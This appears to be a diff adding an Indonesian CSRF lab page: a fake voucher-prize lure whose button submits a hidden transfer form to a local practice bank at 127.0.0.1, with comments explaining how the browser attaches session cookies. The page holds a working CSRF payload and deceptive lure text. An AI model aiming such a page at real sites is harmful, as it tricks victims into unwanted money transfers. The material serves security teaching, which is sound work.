@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Selamat! Kamu Menang Voucher</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 560px; margin: 40px auto; padding: 0 16px; text-align: center; }
+    .lab { background: #f8d7da; border: 1px solid #dc3545; padding: 10px; border-radius: 6px; text-align: left; font-size: 14px; }
+    button { font-size: 20px; padding: 12px 24px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="lab">
+    <strong>⚠️ HALAMAN PENYERANG — DEMO LAB CSRF</strong><br>
+    Halaman ini hanya menargetkan Bank Latihan milikmu sendiri di
+    <code>http://127.0.0.1:3060</code>. Jangan mengganti alamat target ke website lain.
+  </div>
+
+  <h1>🎉 Selamat! Kamu menang voucher Rp 500.000</h1>
+  <p>Klik tombol di bawah untuk klaim hadiahmu.</p>
+
+  <!--
+    Yang sebenarnya terjadi: tombol ini mengirim form transfer ke bank latihan.
+    Halaman ini TIDAK tahu cookie session bank. Browser-lah yang otomatis
+    menempelkan cookie itu ke request. Itulah inti CSRF.
+
+    Pertanyaan untuk catatan.md:
+    - Kenapa form ini tidak bisa mengisi CSRF token yang benar?
+    - Kalau penyerang membuat halaman ini auto-submit (tanpa klik),
+      apakah korban bahkan sadar?
+  -->
+  <form method="POST" action="http://127.0.0.1:3060/transfer">
+    <input type="hidden" name="ke" value="rekening-penyerang">
+    <input type="hidden" name="jumlah" value="250000">
+    <button type="submit">Klaim Hadiah</button>
+  </form>
+</body>
+</html>
